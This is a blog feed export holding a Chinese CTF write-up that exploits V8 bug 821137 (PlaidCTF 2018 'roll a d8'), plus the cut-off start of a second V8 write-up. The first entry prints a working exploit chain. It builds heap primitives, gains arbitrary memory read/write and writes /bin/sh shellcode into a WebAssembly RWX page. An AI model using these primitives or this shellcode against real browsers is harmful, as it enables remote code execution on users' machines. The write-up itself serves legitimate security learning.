<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>浏览器漏洞学习--V8--Plaid CTF roll a d8</title>
      <link href="/2020/06/14/plaidctf2018-roll_a_d8/"/>
      <url>/2020/06/14/plaidctf2018-roll_a_d8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续学习浏览器漏洞的相关知识，加油！！！下周争取把angr的东西总结一下，搞搞课题吧つ﹏⊂。如果有有缘的人读到这篇文章，而且恰好你研究的方向是AEG相关，可以带带我这个菜鸡吗/(ㄒoㄒ)/~~。邮箱：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p><p>之前文章：</p><p><a href="http://pwn.sofr.website/2020/06/01/v8开坑/" target="_blank" rel="noopener">v8开坑+starCTF2019 oob</a></p><p><a href="http://pwn.sofr.website/2020/06/06/数字经济/" target="_blank" rel="noopener">数字经济final-browser</a></p><p>关键字： <code>CTF</code> <code>pwn</code> <code>browser</code> <code>v8</code> <code>Plaid CTF roll a d8</code></p><a id="more"></a><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>这次这个题目就是给了poc写exp，也是一个真实的漏洞。可以看下官网，也有提。<a href="https://chromium.googlesource.com/v8/v8/+/b5da57a06de8791693c248b7aafc734861a3785d^!/" target="_blank" rel="noopener">更新后版本</a></p><p>所以应该兴奋一点啊，搓搓手，这可是真正的realword。开森！！！</p><p>和之前的题目一样，先看diff，官网给出的diff是这样的：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc</span><br><span class="line">index dcf3be4..3a74342 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array-gen.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array-gen.cc</span></span><br><span class="line"><span class="meta">@@ -1945,10 +1945,13 @@</span></span><br><span class="line">   void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,</span><br><span class="line">                          TNode&lt;Number&gt; length) &#123;</span><br><span class="line">     Label fast(this), runtime(this), done(this);</span><br><span class="line"><span class="addition">+    // TODO(delphick): We should be able to skip the fast set altogether, if the</span></span><br><span class="line"><span class="addition">+    // length already equals the expected length, which it always is now on the</span></span><br><span class="line"><span class="addition">+    // fast path.</span></span><br><span class="line">     // Only set the length in this stub if</span><br><span class="line">     // 1) the array has fast elements,</span><br><span class="line">     // 2) the length is writable,</span><br><span class="line"><span class="deletion">-    // 3) the new length is greater than or equal to the old length.</span></span><br><span class="line"><span class="addition">+    // 3) the new length is equal to the old length.</span></span><br><span class="line"> </span><br><span class="line">     // 1) Check that the array has fast elements.</span><br><span class="line">     // TODO(delphick): Consider changing this since it does an an unnecessary</span><br><span class="line"><span class="meta">@@ -1970,10 +1973,10 @@</span></span><br><span class="line">       // BranchIfFastJSArray above.</span><br><span class="line">       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-      // 3) If the created array already has a length greater than required,</span></span><br><span class="line"><span class="addition">+      // 3) If the created array's length does not match the required length,</span></span><br><span class="line">       //    then use the runtime to set the property as that will insert holes</span><br><span class="line"><span class="deletion">-      //    into the excess elements and/or shrink the backing store.</span></span><br><span class="line"><span class="deletion">-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span></span><br><span class="line"><span class="addition">+      //    into excess elements or shrink the backing store as appropriate.</span></span><br><span class="line"><span class="addition">+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</span></span><br><span class="line"> </span><br><span class="line">       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                      length_smi);</span><br><span class="line">diff --git a/test/mjsunit/regress/regress-821137.js b/test/mjsunit/regress/regress-821137.js</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..639b3b9</span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/test/mjsunit/regress/regress-821137.js</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,27 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2018 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="addition">+// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="addition">+// found in the LICENSE file.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Tests that creating an iterator that shrinks the array populated by</span></span><br><span class="line"><span class="addition">+// Array.from does not lead to out of bounds writes.</span></span><br><span class="line"><span class="addition">+let oobArray = [];</span></span><br><span class="line"><span class="addition">+let maxSize = 1028 * 8;</span></span><br><span class="line"><span class="addition">+Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; (</span></span><br><span class="line"><span class="addition">+  &#123;</span></span><br><span class="line"><span class="addition">+    counter : 0,</span></span><br><span class="line"><span class="addition">+    next() &#123;</span></span><br><span class="line"><span class="addition">+      let result = this.counter++;</span></span><br><span class="line"><span class="addition">+      if (this.counter &gt; maxSize) &#123;</span></span><br><span class="line"><span class="addition">+        oobArray.length = 0;</span></span><br><span class="line"><span class="addition">+        return &#123;done: true&#125;;</span></span><br><span class="line"><span class="addition">+      &#125; else &#123;</span></span><br><span class="line"><span class="addition">+        return &#123;value: result, done: false&#125;;</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+) &#125;);</span></span><br><span class="line"><span class="addition">+assertEquals(oobArray.length, maxSize);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// iterator reset the length to 0 just before returning done, so this will crash</span></span><br><span class="line"><span class="addition">+// if the backing store was not resized correctly.</span></span><br><span class="line"><span class="addition">+oobArray[oobArray.length - 1] = 0x41414141;</span></span><br></pre></td></tr></table></figure><p>后面还附带了poc，很贴心。其实这个漏洞的细节，我还是有一点不太懂，但是有了这个poc，可以说难度降低了很多。</p><p>首先还是看下漏洞是如何来的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GenerateSetLength</span><span class="params">(TNode&lt;Context&gt; context, TNode&lt;Object&gt; <span class="built_in">array</span>, TNode&lt;Number&gt; length)</span> </span>&#123;</span><br><span class="line">  Label fast(this), runtime(this), done(this);</span><br><span class="line">  BranchIfFastJSArray(<span class="built_in">array</span>, context, &amp;fast, &amp;runtime);</span><br><span class="line"></span><br><span class="line">  BIND(&amp;fast);</span><br><span class="line">  &#123;</span><br><span class="line">    TNode&lt;JSArray&gt; fast_array = CAST(<span class="built_in">array</span>);</span><br><span class="line">    TNode&lt;Smi&gt; length_smi = CAST(length);</span><br><span class="line">    TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);</span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, TaggedIsPositiveSmi(old_length));</span><br><span class="line">    EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line">    GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">    StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);</span><br><span class="line">    Goto(&amp;done);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;runtime);</span><br><span class="line">  &#123;</span><br><span class="line">    CallRuntime(Runtime::kSetProperty, context, <span class="keyword">static_cast</span>&lt;Node*&gt;(<span class="built_in">array</span>), CodeStubAssembler::LengthStringConstant(), length, SmiConstant(LanguageMode::kStrict));</span><br><span class="line">    Goto(&amp;done);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面我们可以看到如果length_smi大于等于old_length，那么久会将fast_array的length赋值为length_smi。理一下上下文的逻辑，就是在迭代的时候，将每次迭代的结果存进数组，同时将数组的长度扩大。如果此时length_smi小于old_length则不会改变数组的长度。</p><p>但是如果在迭代的最后一轮，我们将数组的大小缩小，此时length_smi会随着迭代次数增长，但是，old_length被改小，此时数组的大小会被改大，但是没有做内存扩大的操作。所以，就造成了oob。在一顿gc后，完全可以做到溢出至其他数组。</p><p>调试poc后发现果然如此，数组的大小是0x2020但是FixedArray中长度却是0</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>其实在搞清楚这个思路后，我们的思路可以和数字经济的exp很像，都是数组越界，这里只不过是多一个gc的过程，使得目标数组重新分配。</p><p>先构造数组越界：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> b = [c];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">        &#123;</span><br><span class="line">                counter : <span class="number">0</span>,</span><br><span class="line">                next() &#123;</span><br><span class="line">                        <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">                                oobArray.length = <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">                                <span class="keyword">let</span> obj = [a];</span><br><span class="line">                                b.push(a);</span><br><span class="line">                                b.push(obj);</span><br><span class="line">                                <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1000000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br></pre></td></tr></table></figure><p>此时，oobArray和B数组中的float数组和object数组就很近了。这时候构建任意对象读和任意对象构造：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">oobArray[<span class="number">7</span>] = <span class="number">0x1</span>;<span class="comment">//使得float数组的长度很大，浮点值中1很大的，(*^_^*)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">object</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                b[<span class="number">2</span>][<span class="number">0</span>] = object;</span><br><span class="line">                <span class="keyword">return</span> f2i(b[<span class="number">1</span>][<span class="number">10</span>])<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">address</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                b[<span class="number">1</span>][<span class="number">10</span>] = i2f(address);</span><br><span class="line">                <span class="keyword">var</span> fakeObject = b[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> fakeObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后也是很常规，造一个任意地址读写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_map = oobArray[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> evil_array = [float_map,<span class="number">0.0</span>,i2f(<span class="number">0x11</span>),i2f(<span class="number">0x400000000</span>)]</span><br><span class="line"><span class="keyword">var</span> leak_addr = addressOf(evil_array);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] leak obj addr: "</span> + hex(leak_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_addr = leak_addr+<span class="number">0xa0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] obj addr: "</span> + hex(fake_obj_addr));</span><br><span class="line"><span class="keyword">var</span> fake_obj = fakeObject(fake_obj_addr+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                        evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10</span>+<span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">var</span> leak_data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                        evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10</span>+<span class="number">1</span>);</span><br><span class="line">                        fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dataview_write</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                write64(addressOf(data_buf)+<span class="number">0x20</span>,addr);</span><br><span class="line">                data_view.setFloat64(<span class="number">0</span>,i2f(data),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dataview_write</span>(<span class="params">addr, payload</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">            write64(addressOf(data_buf)+<span class="number">0x20</span>,addr);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;payload.length; i++) &#123;</span><br><span class="line">                                data_view.setUint8(i, payload[i]);</span><br><span class="line">                            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在触发getshell的时候，我们不用free_hook了，改用wasm，学习一下。</p><p>wasm简单来说就是构建了一个可读可写可执行的内存区域，然后放shellcode，也就很自然了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wasm_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> wasmImports = &#123;</span><br><span class="line">env: &#123;</span><br><span class="line">puts: <span class="function"><span class="keyword">function</span> <span class="title">puts</span> (<span class="params">index</span>) </span>&#123;</span><br><span class="line">print(utf8ToString(h, index));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">137</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">                 <span class="number">96</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">140</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">118</span>,<span class="number">4</span>,<span class="number">112</span>,<span class="number">117</span>,</span><br><span class="line">                 <span class="number">116</span>,<span class="number">115</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">                 <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">146</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,</span><br><span class="line">                 <span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">141</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">                 <span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">135</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">146</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line">                 <span class="number">65</span>,<span class="number">16</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(buffer),wasmImports);</span><br><span class="line">    <span class="keyword">let</span> h = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(m.exports.memory.buffer);</span><br><span class="line">    <span class="keyword">return</span> m.exports.hello;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func = wasm_func();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_obj_addr = addressOf(func);</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(wasm_obj_addr+<span class="number">0x18</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(shared_info_addr+<span class="number">8</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = (read64(code_addr+<span class="number">0x72</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm obj addr: 0x"</span>+hex(wasm_obj_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm shared info addr: 0x"</span>+hex(shared_info_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm code addr: 0x"</span>+hex(code_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx addr: 0x"</span>+hex(rwx_addr));</span><br></pre></td></tr></table></figure><p>最后向这个内存写入shellcode：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">106</span>, <span class="number">104</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">dataview_write(rwx_addr, shellcode);</span><br><span class="line">func();</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"debug"</span>);</span><br></pre></td></tr></table></figure><p>最后getshell，比之前的getshell的界面整洁多了：</p><p><img src="/2020/06/14/plaidctf2018-roll_a_d8/image-20200614213832008.png" alt="image-20200614213832008"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p><p>之前文章：</p><p><a href="http://pwn.sofr.website/2020/06/01/v8开坑/" target="_blank" rel="noopener">v8开坑+starCTF2019 oob</a></p><p><a href="http://pwn.sofr.website/2020/06/06/数字经济/" target="_blank" rel="noopener">数字经济final-browser</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> browser </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器漏洞学习--V8--数字经济final-browser</title>
      <link href="/2020/06/06/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/"/>
      <url>/2020/06/06/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续学习浏览器漏洞的相关知识。</p><p>之前文章：</p><p>v8开坑+starCTF2019 oob：<a href="http://pwn.sofr.website/2020/06/01/v8开坑/" target="_blank" rel="noopener">http://pwn.sofr.website/2020/06/01/v8%E5%BC%80%E5%9D%91/</a></p><p>关键字： <code>CTF</code> <code>pwn</code> <code>browser</code> <code>v8</code> <code>数字经济</code></p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2</span><br><span class="line">git apply /home/sofr/browser_pwn/数字经济-final-browser/browser/diff.patch</span><br></pre></td></tr></table></figure><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>先查看diff：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 